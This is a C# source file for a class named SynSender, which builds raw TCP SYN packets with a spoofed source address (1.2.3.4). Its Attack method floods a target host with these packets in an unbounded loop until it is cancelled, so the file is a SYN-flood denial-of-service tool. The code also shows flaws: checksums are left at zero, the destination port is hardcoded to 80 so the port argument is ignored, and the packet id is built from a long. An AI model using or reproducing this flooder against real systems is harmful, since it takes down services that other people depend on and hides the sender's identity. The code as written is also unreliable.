using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Mtf.Network
{
    /// <summary>
    /// Send SYN package from the 3-Way Handshake
    /// </summary>
    public class SynSender
    {
        private readonly InetAddrConverter inetAddrConverter = new InetAddrConverter();
        private CancellationTokenSource cancellationTokenSource;

        public void Send(string ipOrHostname, ushort port)
        {
            var socket = GetSocket(ipOrHostname, port);
            if (socket != null)
            {
                var bytes = GetSynPacket(ipOrHostname);
                socket.Send(bytes, bytes.Length, SocketFlags.None);
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
            }
        }

        public void Attack(string ipOrHostname, ushort port)
        {
            var socket = GetSocket(ipOrHostname, port);
            if (socket != null)
            {
                cancellationTokenSource = new CancellationTokenSource();

                var bytes = GetSynPacket(ipOrHostname);
                Task.Factory.StartNew(() =>
                {
                    while (!cancellationTokenSource.Token.IsCancellationRequested)
                    {
                        socket.Send(bytes, bytes.Length, SocketFlags.None);
                    }
                    socket.Shutdown(SocketShutdown.Both);
                    socket.Close();
                    cancellationTokenSource.Dispose();
                }, cancellationTokenSource.Token);
            }
        }

        public void StopAttack()
        {
            cancellationTokenSource?.Cancel();
        }

        private static Socket GetSocket(string ipOrHostname, ushort port)
        {
            var destination = GetDestination(ipOrHostname);
            var destinationIpAddresses = destination.AddressList.GetEnumerator();

            while (destinationIpAddresses.MoveNext())
            {
                var address = destinationIpAddresses.Current as IPAddress;
                if (address != null)
                {
                    var endPoint = new IPEndPoint(address, port);

                    var socket = new Socket(endPoint.AddressFamily, SocketType.Raw, ProtocolType.IP);
                    //socket.ReceiveBufferSize = Constants.MAX_BUFFER_SIZE_BIG;
                    socket.Connect(endPoint);

                    if (socket.Connected)
                    {
                        return socket;
                    }
                }
            }
            return null;
        }

        private static IPHostEntry GetDestination(string ipOrHostname)
        {
            //return Dns.Resolve(ipOrHostname); // Obsolate
            return Dns.GetHostEntry(ipOrHostname); // If slow use hosts file
        }

        private byte[] GetSynPacket(string ipOrHostname)
        {
            IpHdr iph;
            var tcph = new TcpHdr();
            iph.ihl = 5;
            iph.version = 4;
            iph.tos = 0;
            iph.tot_len = (uint)(Marshal.SizeOf(typeof(IpHdr)) + Marshal.SizeOf(typeof(TcpHdr)));
            iph.id = IPAddress.HostToNetworkOrder((long)54321); // ID of this packet
            //iph.id = htonl(54321); // ID of this packet
            iph.frag_off = 0;
            iph.ttl = 255;
            iph.protocol = 6; // IPPROTO_TCP;
            iph.check = 0;

            iph.saddr = inetAddrConverter.Convert("1.2.3.4"); // Source address

            iph.daddr = inetAddrConverter.Convert(ipOrHostname); // Destination address - "169.254.52.154";
            //iph.check = csum((unsigned short *)buffer, iph.tot_len >> 1);

            tcph.source = IPAddress.HostToNetworkOrder((short)1234); // port
            tcph.dest = IPAddress.HostToNetworkOrder((short)80); // port
            //tcph.source = htons(1234); // port
            //tcph.dest = htons(4444); // port
            tcph.seq = 0;
            tcph.ack_seq = 0;
            tcph.doff = 5;
            tcph.fin = 0;
            tcph.syn = 1;
            tcph.rst = 0;
            tcph.psh = 0;
            tcph.ack = 0;
            tcph.urg = 0;
            tcph.window = IPAddress.HostToNetworkOrder((short)5840); // Maximum allowed window size
            //tcph.window = htons(5840); // Maximum allowed window size
            tcph.check = 0;
            tcph.urg_ptr = 0;
            //struct pseudo_header psh;

            var size = Marshal.SizeOf(iph) + Marshal.SizeOf(tcph);
            var bytes = new byte[size];
            var ptr = Marshal.AllocHGlobal(Marshal.SizeOf(iph));
            Marshal.StructureToPtr(iph, ptr, true);
            Marshal.Copy(ptr, bytes, 0, Marshal.SizeOf(iph));
            Marshal.FreeHGlobal(ptr);
            ptr = Marshal.AllocHGlobal(Marshal.SizeOf(tcph));
            Marshal.StructureToPtr(tcph, ptr, true);
            Marshal.Copy(ptr, bytes, Marshal.SizeOf(iph), Marshal.SizeOf(tcph));
            Marshal.FreeHGlobal(ptr);
            return bytes;
        }
    }
}